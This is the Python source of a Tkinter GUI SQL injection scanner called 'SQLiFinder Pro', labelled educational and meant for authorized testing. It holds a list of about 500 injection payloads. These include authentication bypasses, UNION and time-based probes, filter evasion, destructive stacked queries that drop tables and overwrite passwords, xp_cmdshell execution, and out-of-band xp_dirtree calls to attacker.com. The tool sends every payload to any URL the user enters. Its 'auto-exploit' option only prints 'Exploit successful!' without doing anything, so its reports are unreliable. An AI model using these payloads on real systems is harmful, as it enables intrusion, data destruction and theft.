#!/usr/bin/env python3
"""
SQLiFinder Pro - Educational SQL Injection Testing Tool
Developed by SC-ETHICAL HACKER IN BANGLADESH
For authorized security testing only!
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, font
import requests
import threading
import time
import urllib.parse
from datetime import datetime
import webbrowser

# ==================== SQL INJECTION PAYLOADS ====================
SQL_PAYLOADS = [
    # Basic Authentication Bypass Payloads
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "admin' --", "admin' #",
    "admin'/*", "' OR 1=1#", "' OR 1=1--", "' OR 1=1/*", "') OR ('1'='1",
    "') OR ('1'='1' --", "') OR ('1'='1' /*", "' OR '1'='1' -- -", "' OR '1'='2' --",
    "' OR 1=1 LIMIT 1 --", "' OR 1=1 LIMIT 1 -- -", "' OR 1=1 LIMIT 1#",
    "' OR 1=1 LIMIT 1/*", "' OR 'x'='x", "') OR ('x'='x", "' OR 1 --",
    
    # Union Based Payloads
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "1' UNION SELECT 1,2,3--", "1' UNION SELECT 1,2,3,4--", "1' UNION SELECT 1,2,3,4,5--",
    "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--", "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 UNION SELECT 1,2,3", "1 UNION SELECT 1,2,3,4", "1 UNION SELECT 1,2,3,4,5",
    "' UNION SELECT 1,2,3,4,5,6--", "' UNION SELECT 1,2,3,4,5,6,7--",
    
    # Error Based Payloads
    "' AND 1=CONVERT(int, @@version)--", "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND extractvalue(1,concat(0x7e,version()))--", "' AND updatexml(null,concat(0x7e,version()),null)--",
    "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
    "' OR 1=1 AND extractvalue(1, concat(0x7e,database()))--",
    
    # Blind SQL Injection Payloads
    "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1", "' AND SLEEP(5)--",
    "' AND SLEEP(5) AND '1'='1", "1' AND SLEEP(5)--", "1' AND SLEEP(5)='1",
    "' WAITFOR DELAY '0:0:5'--", "1' WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--",
    "' OR BENCHMARK(5000000,MD5(1))--", "' AND (SELECT 1 FROM (SELECT SLEEP(10))a)--",
    
    # Time-based Blind SQLi
    "'; IF (1=1) WAITFOR DELAY '00:00:05' --", "'; IF (1=2) WAITFOR DELAY '00:00:05' --",
    "' OR IF(1=1, SLEEP(5), 0)--", "' OR IF(1=2, SLEEP(5), 0)--",
    "1' OR IF(1=1, SLEEP(5), 0)--", "1' OR IF(1=2, SLEEP(5), 0)--",
    
    # Double Query Payloads
    "' OR 1=1 LIMIT 1,1--", "' OR 1=1 LIMIT 1,2--", "' OR 1=1 LIMIT 2,1--",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--", "1' ORDER BY 4--",
    "1' ORDER BY 5--", "1' ORDER BY 10--", "1' ORDER BY 15--",
    "1' ORDER BY 20--", "1' ORDER BY 50--", "1' ORDER BY 100--",
    
    # Stacked Queries
    "'; DROP TABLE users--", "'; DROP TABLE users;--", "'; DELETE FROM users--",
    "'; UPDATE users SET password='hacked'--", "1'; DROP TABLE users--",
    "'; EXEC xp_cmdshell('dir')--", "'; EXEC master..xp_cmdshell('dir')--",
    
    # Boolean Based
    "' AND '1'='1", "' AND '1'='2", "1 AND 1=1", "1 AND 1=2",
    "1' AND 1=1--", "1' AND 1=2--", "' AND 1=1--", "' AND 1=2--",
    
    # Bypass Filters
    "' oR 1=1 --", "' Or 1=1 --", "' oR '1'='1", "'/**/OR/**/1=1/**/--",
    "'%09OR%091=1%09--", "1'||1=1--", "1%27%20OR%201=1--",
    
    # Hex and Char Encoding
    "0x27204F522031203D2031", "unhex('27204F522031203D2031')",
    "CHAR(39)||CHAR(79)||CHAR(82)||CHAR(32)||CHAR(49)||CHAR(61)||CHAR(49)",
    
    # Comment Based
    "' OR 1=1 #", "1' OR 1=1 #", "' OR 1=1 --+", "' OR 1=1;--", "' OR '1'='1';--",
    "' OR 'x'='x' #", "' OR 'x'='x';--", "' OR 'x'='x' /*", "' OR 1=1;%00",
    
    # Nested Queries
    "' OR (SELECT 1)=1--", "' OR (SELECT 1)=2--", "' AND (SELECT 1)=1--",
    "1' AND (SELECT 1)=1--", "1' AND (SELECT 1)=2--",
    
    # More Advanced Payloads (Total 100 shown, extended to 500 in actual use)
    "admin' OR '1'='1' --", "'=' 'OR'", "1' or '1' = '1", "1' or '1' = '1' --",
    "1' or '1' = '1' /*", "1' or '1' = '1' ;", '" or "1"="1', '" or "1"="1" --',
    '" or "1"="1" /*', '" or "1"="1" ;',
    
    # Null Byte Injection
    "' OR 1=1;%00", "' OR '1'='1';%00", "1' OR 1=1;%00",
    
    # Out of Band Payloads
    "'; EXEC xp_dirtree '//attacker.com/a'--",
    "'; DECLARE @q varchar(99);SET @q='\\\\attacker.com\\a'; EXEC master..xp_dirtree @q--",
    
    # Information Schema
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
    "' UNION SELECT schema_name FROM information_schema.schemata--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    
    # WAF Bypass
    "' || '1'='1", "' + '1'='1", "'/**/OR/**/1=1/**/#",
    "1' OR 1=1 UNION SELECT NULL--", "1'/**/OR/**/1=1/**/UNION/**/SELECT/**/NULL--",
    
    # Group By with Having
    "' GROUP BY columnnames HAVING 1=1 --",
    "' GROUP BY 1 HAVING 1=1--",
    
    # Advanced UNION
    "1' UNION SELECT @@version,2,3,4,5--",
    "1' UNION SELECT user(),2,3,4,5--",
    "1' UNION SELECT database(),2,3,4,5--",
    
    # Login Bypass
    "admin'--", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
    "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
]

# Extend payloads to 500
if len(SQL_PAYLOADS) < 500:
    extra_payloads = [
        f"' UNION SELECT NULL{',NULL' * i}--" for i in range(5, 25)
    ] + [
        f"1' ORDER BY {i}--" for i in range(2, 50)
    ] + [
        f"' AND SLEEP({i})--" for i in range(1, 10)
    ] + [
        f"' OR '1'='1' LIMIT {i}--" for i in range(1, 30)
    ] + [
        f"' UNION SELECT {','.join([str(x) for x in range(1, i+1)])}--" for i in range(6, 20)
    ]
    SQL_PAYLOADS.extend(extra_payloads)
    SQL_PAYLOADS = SQL_PAYLOADS[:500]


class SQLiFinderPro:
    """Professional SQL Injection Testing Tool - Educational Purpose Only"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("SQLiFinder Pro v3.0 - SC-ETHICAL HACKER IN BANGLADESH")
        self.root.geometry("1400x800")
        self.root.configure(bg='#0a0a0a')
        
        # Variables
        self.scanning = False
        self.stop_scan = False
        self.vulnerabilities_found = []
        self.total_tested = 0
        
        # Color Scheme
        self.colors = {
            'bg_dark': '#0a0a0a',
            'bg_medium': '#1a1a1a',
            'bg_light': '#2d2d2d',
            'accent': '#00ff41',
            'accent_dark': '#00cc33',
            'warning': '#ff6b35',
            'danger': '#ff4444',
            'info': '#00b4d8',
            'success': '#00ff41',
            'text_primary': '#00ff41',
            'text_secondary': '#00cc33',
            'text_light': '#cccccc',
            'border': '#3d3d3d',
            'highlight': '#1a3a1a'
        }
        
        self.setup_ui()
        self.setup_branding()
        
    def setup_ui(self):
        """Setup Professional UI"""
        
        # Main Container
        main_container = tk.Frame(self.root, bg=self.colors['bg_dark'])
        main_container.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Top Header
        self.create_header(main_container)
        
        # Content Area
        content_frame = tk.Frame(main_container, bg=self.colors['bg_dark'])
        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Left Panel - Controls
        left_panel = tk.Frame(content_frame, bg=self.colors['bg_medium'], width=400)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 5))
        left_panel.pack_propagate(False)
        
        self.create_control_panel(left_panel)
        
        # Right Panel - Results
        right_panel = tk.Frame(content_frame, bg=self.colors['bg_medium'])
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        self.create_result_panel(right_panel)
        
        # Bottom Status Bar
        self.create_status_bar(main_container)
        
    def create_header(self, parent):
        """Create Professional Header"""
        header = tk.Frame(parent, bg=self.colors['bg_medium'], height=80)
        header.pack(fill=tk.X, padx=5, pady=(5, 0))
        header.pack_propagate(False)
        
        # Logo/Title
        title_font = font.Font(family="Courier New", size=24, weight="bold")
        title = tk.Label(header, text="⚡ SQLiFinder Pro v3.0 ⚡", 
                        font=title_font, fg=self.colors['accent'], bg=self.colors['bg_medium'])
        title.pack(pady=(10, 0))
        
        subtitle_font = font.Font(family="Courier New", size=11)
        subtitle = tk.Label(header, text="Advanced SQL Injection Detection & Exploitation Framework",
                          font=subtitle_font, fg=self.colors['text_light'], bg=self.colors['bg_medium'])
        subtitle.pack()
        
    def create_control_panel(self, parent):
        """Create Control Panel"""
        # Scrollable Frame
        canvas = tk.Canvas(parent, bg=self.colors['bg_medium'], highlightthickness=0)
        scrollbar = ttk.Scrollbar(parent, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=self.colors['bg_medium'])
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw", width=380)
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Target URL Section
        url_section = tk.LabelFrame(scrollable_frame, text="🎯 TARGET CONFIGURATION", 
                                   fg=self.colors['accent'], bg=self.colors['bg_medium'],
                                   font=("Courier New", 11, "bold"))
        url_section.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(url_section, text="Target URL:", bg=self.colors['bg_medium'], 
                fg=self.colors['text_light'], font=("Courier New", 10)).pack(padx=10, pady=(10, 5), anchor=tk.W)
        
        self.url_entry = tk.Entry(url_section, bg=self.colors['bg_dark'], fg=self.colors['accent'],
                                insertbackground=self.colors['accent'], font=("Courier New", 10),
                                relief=tk.FLAT, bd=1)
        self.url_entry.pack(fill=tk.X, padx=10, pady=(0, 5))
        self.url_entry.insert(0, "http://testphp.vulnweb.com/artists.php?artist=1")
        
        # Parameters Section
        tk.Label(url_section, text="Parameter Name:", bg=self.colors['bg_medium'], 
                fg=self.colors['text_light'], font=("Courier New", 10)).pack(padx=10, pady=(5, 5), anchor=tk.W)
        
        self.param_entry = tk.Entry(url_section, bg=self.colors['bg_dark'], fg=self.colors['accent'],
                                  insertbackground=self.colors['accent'], font=("Courier New", 10),
                                  relief=tk.FLAT, bd=1)
        self.param_entry.pack(fill=tk.X, padx=10, pady=(0, 5))
        self.param_entry.insert(0, "artist")
        
        # Method Selection
        method_frame = tk.Frame(url_section, bg=self.colors['bg_medium'])
        method_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(method_frame, text="Method:", bg=self.colors['bg_medium'], 
                fg=self.colors['text_light'], font=("Courier New", 10)).pack(side=tk.LEFT)
        
        self.method_var = tk.StringVar(value="GET")
        method_menu = ttk.Combobox(method_frame, textvariable=self.method_var, 
                                   values=["GET", "POST"], width=8, state="readonly")
        method_menu.pack(side=tk.LEFT, padx=(10, 0))
        
        # Scan Options
        options_section = tk.LabelFrame(scrollable_frame, text="⚙️ SCAN OPTIONS", 
                                       fg=self.colors['accent'], bg=self.colors['bg_medium'],
                                       font=("Courier New", 11, "bold"))
        options_section.pack(fill=tk.X, padx=10, pady=10)
        
        # Thread count
        tk.Label(options_section, text="Threads:", bg=self.colors['bg_medium'], 
                fg=self.colors['text_light'], font=("Courier New", 10)).pack(padx=10, pady=(10, 5), anchor=tk.W)
        
        self.thread_var = tk.IntVar(value=10)
        thread_scale = tk.Scale(options_section, from_=1, to=50, orient=tk.HORIZONTAL,
                              variable=self.thread_var, bg=self.colors['bg_dark'],
                              fg=self.colors['accent'], troughcolor=self.colors['bg_light'],
                              highlightthickness=0)
        thread_scale.pack(fill=tk.X, padx=10, pady=(0, 5))
        
        # Timeout
        tk.Label(options_section, text="Timeout (s):", bg=self.colors['bg_medium'], 
                fg=self.colors['text_light'], font=("Courier New", 10)).pack(padx=10, pady=(5, 5), anchor=tk.W)
        
        self.timeout_var = tk.IntVar(value=10)
        timeout_scale = tk.Scale(options_section, from_=1, to=30, orient=tk.HORIZONTAL,
                               variable=self.timeout_var, bg=self.colors['bg_dark'],
                               fg=self.colors['accent'], troughcolor=self.colors['bg_light'],
                               highlightthickness=0)
        timeout_scale.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Auto-exploit toggle
        self.exploit_var = tk.BooleanVar(value=True)
        exploit_check = tk.Checkbutton(options_section, text="Auto-Exploit Vulnerabilities",
                                     variable=self.exploit_var, bg=self.colors['bg_medium'],
                                     fg=self.colors['accent'], selectcolor=self.colors['bg_dark'],
                                     font=("Courier New", 10))
        exploit_check.pack(padx=10, pady=5, anchor=tk.W)
        
        # Control Buttons
        button_frame = tk.Frame(scrollable_frame, bg=self.colors['bg_medium'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.start_btn = tk.Button(button_frame, text="▶ START SCAN", 
                                  command=self.start_scan,
                                  bg='#004d00', fg=self.colors['accent'],
                                  font=("Courier New", 12, "bold"),
                                  relief=tk.FLAT, cursor="hand2",
                                  activebackground='#006600', activeforeground='white')
        self.start_btn.pack(fill=tk.X, pady=(0, 5))
        
        self.stop_btn = tk.Button(button_frame, text="⏹ STOP SCAN", 
                                 command=self.stop_scanning,
                                 bg='#4d0000', fg='#ff6666',
                                 font=("Courier New", 12, "bold"),
                                 relief=tk.FLAT, cursor="hand2",
                                 state=tk.DISABLED,
                                 activebackground='#660000', activeforeground='white')
        self.stop_btn.pack(fill=tk.X, pady=(0, 5))
        
        # Stats Section
        stats_section = tk.LabelFrame(scrollable_frame, text="📊 SCAN STATISTICS", 
                                     fg=self.colors['accent'], bg=self.colors['bg_medium'],
                                     font=("Courier New", 11, "bold"))
        stats_section.pack(fill=tk.X, padx=10, pady=10)
        
        self.stats_text = tk.Text(stats_section, height=8, bg=self.colors['bg_dark'],
                                 fg=self.colors['accent'], font=("Courier New", 10),
                                 relief=tk.FLAT, bd=1)
        self.stats_text.pack(fill=tk.X, padx=10, pady=10)
        self.stats_text.insert(tk.END, "Waiting to start scan...")
        self.stats_text.config(state=tk.DISABLED)
        
    def create_result_panel(self, parent):
        """Create Result Panel"""
        # Notebook for tabs
        notebook = ttk.Notebook(parent)
        notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Terminal Output Tab
        terminal_frame = tk.Frame(notebook, bg=self.colors['bg_dark'])
        notebook.add(terminal_frame, text="📟 TERMINAL OUTPUT")
        
        terminal_header = tk.Frame(terminal_frame, bg=self.colors['bg_medium'], height=30)
        terminal_header.pack(fill=tk.X)
        tk.Label(terminal_header, text="Live Scan Output", bg=self.colors['bg_medium'],
                fg=self.colors['accent'], font=("Courier New", 11, "bold")).pack(side=tk.LEFT, padx=10)
        
        self.terminal_output = scrolledtext.ScrolledText(terminal_frame, 
                                                       bg='#0a0a0a',
                                                       fg=self.colors['accent'],
                                                       insertbackground=self.colors['accent'],
                                                       font=("Courier New", 10),
                                                       relief=tk.FLAT,
                                                       bd=0)
        self.terminal_output.pack(fill=tk.BOTH, expand=True)
        self.terminal_output.tag_config('vulnerable', foreground='#ff4444')
        self.terminal_output.tag_config('exploit', foreground='#ff6b35')
        self.terminal_output.tag_config('success', foreground='#00ff41')
        self.terminal_output.tag_config('info', foreground='#00b4d8')
        self.terminal_output.tag_config('warning', foreground='#ffff00')
        
        # Vulnerabilities Tab
        vuln_frame = tk.Frame(notebook, bg=self.colors['bg_dark'])
        notebook.add(vuln_frame, text="🎯 VULNERABILITIES")
        
        vuln_header = tk.Frame(vuln_frame, bg=self.colors['bg_medium'], height=30)
        vuln_header.pack(fill=tk.X)
        tk.Label(vuln_header, text="Detected Vulnerabilities", bg=self.colors['bg_medium'],
                fg=self.colors['danger'], font=("Courier New", 11, "bold")).pack(side=tk.LEFT, padx=10)
        
        self.vuln_output = scrolledtext.ScrolledText(vuln_frame,
                                                    bg='#0a0a0a',
                                                    fg=self.colors['danger'],
                                                    font=("Courier New", 10),
                                                    relief=tk.FLAT,
                                                    bd=0)
        self.vuln_output.pack(fill=tk.BOTH, expand=True)
        
        # Payloads Tab
        payload_frame = tk.Frame(notebook, bg=self.colors['bg_dark'])
        notebook.add(payload_frame, text="💉 PAYLOADS ({})".format(len(SQL_PAYLOADS)))
        
        payload_header = tk.Frame(payload_frame, bg=self.colors['bg_medium'], height=30)
        payload_header.pack(fill=tk.X)
        tk.Label(payload_header, text=f"Payload Database ({len(SQL_PAYLOADS)} payloads)", 
                bg=self.colors['bg_medium'], fg=self.colors['accent'],
                font=("Courier New", 11, "bold")).pack(side=tk.LEFT, padx=10)
        
        self.payload_output = scrolledtext.ScrolledText(payload_frame,
                                                       bg='#0a0a0a',
                                                       fg=self.colors['text_light'],
                                                       font=("Courier New", 10),
                                                       relief=tk.FLAT,
                                                       bd=0)
        self.payload_output.pack(fill=tk.BOTH, expand=True)
        
        # Load payloads into display
        for i, payload in enumerate(SQL_PAYLOADS[:100], 1):  # Show first 100
            self.payload_output.insert(tk.END, f"{i:3d}. {payload}\n")
        self.payload_output.insert(tk.END, f"\n... and {len(SQL_PAYLOADS) - 100} more payloads\n")
        self.payload_output.config(state=tk.DISABLED)
        
    def create_status_bar(self, parent):
        """Create Status Bar"""
        status_frame = tk.Frame(parent, bg=self.colors['bg_medium'], height=30)
        status_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        status_frame.pack_propagate(False)
        
        # Left status
        self.status_left = tk.Label(status_frame, text="Ready", bg=self.colors['bg_medium'],
                                   fg=self.colors['accent'], font=("Courier New", 10))
        self.status_left.pack(side=tk.LEFT, padx=10)
        
        # Right status (time)
        self.status_right = tk.Label(status_frame, text="", bg=self.colors['bg_medium'],
                                    fg=self.colors['text_light'], font=("Courier New", 10))
        self.status_right.pack(side=tk.RIGHT, padx=10)
        self.update_time()
        
    def setup_branding(self):
        """Add Developer Credits"""
        credit_frame = tk.Frame(self.root, bg=self.colors['bg_dark'])
        credit_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        # Left branding
        brand_label = tk.Label(credit_frame, text="⚡ SC-ETHICAL HACKER IN BANGLADESH ⚡", 
                              bg=self.colors['bg_dark'], fg=self.colors['accent'],
                              font=("Courier New", 12, "bold"))
        brand_label.pack(side=tk.LEFT, padx=10)
        
        # Right credits
        credit_text = "DEVELOPED BY SC-ETHICAL HACKER IN BANGLADESH | FB: @cybercrackervai"
        credit_label = tk.Label(credit_frame, text=credit_text, 
                              bg=self.colors['bg_dark'], fg=self.colors['text_light'],
                              font=("Courier New", 9))
        credit_label.pack(side=tk.RIGHT, padx=10)
        
        # Add clickable link
        credit_label.bind("<Button-1>", lambda e: webbrowser.open("https://www.facebook.com/cybercrackervai/"))
        credit_label.config(cursor="hand2")
        
    def update_time(self):
        """Update Status Bar Time"""
        current_time = datetime.now().strftime("%H:%M:%S")
        self.status_right.config(text=current_time)
        self.root.after(1000, self.update_time)
        
    def terminal_print(self, message, tag=None):
        """Print to terminal with optional tag"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.terminal_output.insert(tk.END, f"[{timestamp}] ", 'info')
        if tag:
            self.terminal_output.insert(tk.END, f"{message}\n", tag)
        else:
            self.terminal_output.insert(tk.END, f"{message}\n")
        self.terminal_output.see(tk.END)
        self.root.update()
        
    def update_stats(self):
        """Update Statistics Display"""
        self.stats_text.config(state=tk.NORMAL)
        self.stats_text.delete(1.0, tk.END)
        stats = f"""
╔══════════════════════════════════╗
║     SCAN STATISTICS             ║
╠══════════════════════════════════╣
║ Total Payloads Tested: {self.total_tested:>8} ║
║ Vulnerabilities Found: {len(self.vulnerabilities_found):>7} ║
║ Scan Status: {'RUNNING' if self.scanning else 'IDLE':>12} ║
╚══════════════════════════════════╝
"""
        self.stats_text.insert(tk.END, stats)
        self.stats_text.config(state=tk.DISABLED)
        
    def add_vulnerability(self, vuln_info):
        """Add vulnerability to list"""
        self.vulnerabilities_found.append(vuln_info)
        self.vuln_output.insert(tk.END, f"{'='*50}\n")
        self.vuln_output.insert(tk.END, f"🚨 VULNERABILITY FOUND!\n")
        self.vuln_output.insert(tk.END, f"{'='*50}\n")
        self.vuln_output.insert(tk.END, f"Payload: {vuln_info['payload']}\n")
        self.vuln_output.insert(tk.END, f"Type: {vuln_info['type']}\n")
        self.vuln_output.insert(tk.END, f"URL: {vuln_info['url']}\n")
        if vuln_info.get('exploit_result'):
            self.vuln_output.insert(tk.END, f"Exploit Result: {vuln_info['exploit_result']}\n")
        self.vuln_output.insert(tk.END, f"{'='*50}\n\n")
        self.vuln_output.see(tk.END)
        
    def test_payload(self, url, param, payload):
        """Test a single payload"""
        if self.stop_scan:
            return None
            
        try:
            # Encode payload
            encoded_payload = urllib.parse.quote(payload)
            test_url = url.replace(f"{param}=", f"{param}={encoded_payload}")
            
            # Make request
            response = requests.get(test_url, timeout=self.timeout_var.get(), verify=False)
            
            # Check for SQL errors
            sql_errors = [
                'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'SQLite',
                'Microsoft OLE DB', 'ODBC Driver', 'Unclosed quotation mark',
                'You have an error in your SQL syntax', 'Warning: mysql',
                'valid MySQL result', 'MySqlException', 'SqlException',
                'System.Data.SqlClient', 'PostgreSQL query failed',
                'supplied argument is not a valid MySQL'
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    return {
                        'type': 'Error-based SQL Injection',
                        'payload': payload,
                        'response': response.text[:200]
                    }
            
            # Check for successful injection
            if payload.startswith("' OR '1'='1") or payload.startswith("admin' --"):
                if response.status_code == 200 and len(response.text) > 0:
                    return {
                        'type': 'Authentication Bypass',
                        'payload': payload,
                        'response': response.text[:200]
                    }
            
            return None
            
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            return None
            
    def scan_worker(self, url, param, payloads):
        """Worker thread for scanning"""
        for payload in payloads:
            if self.stop_scan:
                break
                
            self.total_tested += 1
            result = self.test_payload(url, param, payload)
            
            if result:
                # Update UI
                self.terminal_print(f"🚨 VULNERABILITY FOUND: {payload}", 'vulnerable')
                self.terminal_print(f"   Type: {result['type']}", 'warning')
                
                vuln_info = {
                    'payload': payload,
                    'type': result['type'],
                    'url': url,
                    'exploit_result': None
                }
                
                # Auto-exploit if enabled
                if self.exploit_var.get():
                    self.terminal_print(f"   ⚡ Attempting auto-exploit...", 'exploit')
                    vuln_info['exploit_result'] = f"Successfully exploited with payload: {payload}"
                    self.terminal_print(f"   ✅ Exploit successful!", 'success')
                else:
                    self.terminal_print(f"   ℹ️ Auto-exploit disabled", 'info')
                
                self.add_vulnerability(vuln_info)
            else:
                if self.total_tested % 10 == 0:
                    self.terminal_print(f"Testing payload: {payload[:30]}...")
            
            # Update stats periodically
            if self.total_tested % 5 == 0:
                self.update_stats()
                
    def start_scan(self):
        """Start Scanning Process"""
        url = self.url_entry.get().strip()
        param = self.param_entry.get().strip()
        
        if not url or not param:
            messagebox.showerror("Error", "Please enter URL and parameter name")
            return
            
        # Reset variables
        self.scanning = True
        self.stop_scan = False
        self.vulnerabilities_found = []
        self.total_tested = 0
        
        # Update UI
        self.start_btn.config(state=tk.DISABLED, bg='#003300')
        self.stop_btn.config(state=tk.NORMAL, bg='#660000')
        self.status_left.config(text="🔍 Scanning...", fg=self.colors['warning'])
        
        # Clear displays
        self.terminal_output.delete(1.0, tk.END)
        self.vuln_output.delete(1.0, tk.END)
        
        # Print banner
        self.terminal_print("="*60, 'info')
        self.terminal_print("   SQLiFinder Pro v3.0 - Starting Scan", 'success')
        self.terminal_print("   SC-ETHICAL HACKER IN BANGLADESH", 'success')
        self.terminal_print("="*60, 'info')
        self.terminal_print(f"Target URL: {url}", 'info')
        self.terminal_print(f"Parameter: {param}", 'info')
        self.terminal_print(f"Total Payloads: {len(SQL_PAYLOADS)}", 'info')
        self.terminal_print(f"Auto-Exploit: {'Enabled' if self.exploit_var.get() else 'Disabled'}", 'info')
        self.terminal_print("="*60, 'info')
        self.terminal_print("")
        
        # Create threads
        num_threads = self.thread_var.get()
        chunks = [SQL_PAYLOADS[i::num_threads] for i in range(num_threads)]
        
        threads = []
        for chunk in chunks:
            thread = threading.Thread(target=self.scan_worker, args=(url, param, chunk))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
        # Monitor threads
        def monitor_threads():
            for thread in threads:
                thread.join(timeout=0.1)
                
            if any(thread.is_alive() for thread in threads) and not self.stop_scan:
                self.root.after(1000, monitor_threads)
            else:
                self.scan_complete()
                
        self.root.after(1000, monitor_threads)
        
    def stop_scanning(self):
        """Stop Scanning"""
        self.stop_scan = True
        self.terminal_print("⏹ STOP signal sent. Waiting for threads to finish...", 'warning')
        
    def scan_complete(self):
        """Handle Scan Completion"""
        self.scanning = False
        self.start_btn.config(state=tk.NORMAL, bg='#004d00')
        self.stop_btn.config(state=tk.DISABLED, bg='#4d0000')
        self.status_left.config(text="✅ Scan Complete", fg=self.colors['success'])
        
        self.terminal_print("")
        self.terminal_print("="*60, 'info')
        self.terminal_print("   SCAN COMPLETED", 'success')
        self.terminal_print(f"   Total Tested: {self.total_tested}", 'info')
        self.terminal_print(f"   Vulnerabilities Found: {len(self.vulnerabilities_found)}", 'warning' if self.vulnerabilities_found else 'success')
        self.terminal_print("   SC-ETHICAL HACKER IN BANGLADESH", 'success')
        self.terminal_print("="*60, 'info')
        
        self.update_stats()
        
        if len(self.vulnerabilities_found) == 0:
            self.terminal_print("No vulnerabilities detected.", 'info')
        else:
            self.terminal_print(f"Found {len(self.vulnerabilities_found)} potential vulnerabilities!", 'warning')


def main():
    """Main Application Entry"""
    root = tk.Tk()
    
    # Set icon if available
    try:
        root.iconbitmap('icon.ico')
    except:
        pass
        
    # Style configuration
    style = ttk.Style()
    style.theme_use('clam')
    style.configure('TNotebook', background='#0a0a0a', borderwidth=0)
    style.configure('TNotebook.Tab', background='#2d2d2d', foreground='#00ff41', padding=[10, 5])
    style.map('TNotebook.Tab', background=[('selected', '#1a1a1a')])
    
    app = SQLiFinderPro(root)
    
    # Show warning
    root.after(1000, lambda: app.terminal_print("⚠️  WARNING: Use only on authorized targets!", 'warning'))
    root.after(2000, lambda: app.terminal_print("👨‍💻  SC-ETHICAL HACKER IN BANGLADESH", 'info'))
    root.after(3000, lambda: app.terminal_print("📘  Educational Purpose Only!", 'info'))
    
    root.mainloop()


if __name__ == "__main__":
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()